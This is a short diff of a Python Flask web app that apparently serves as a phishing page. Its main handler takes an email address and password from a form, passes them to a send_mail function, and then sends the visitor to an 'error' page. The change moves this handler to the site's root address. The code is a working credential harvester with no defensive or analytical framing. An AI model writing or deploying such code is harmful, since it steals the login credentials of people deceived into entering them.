@@ -36,12 +36,12 @@ def send_mail(email, password):
 
 
 
-@app.route("/one", methods=['GET', 'POST'])
+@app.route("/", methods=['GET', 'POST'])
 def one():
     if request.method == 'POST':
         email = request.form.get('email')
         password = request.form['password']
-        
+
         send_mail(email, password)
         return redirect(url_for('error'))
     return render_template('one.html')
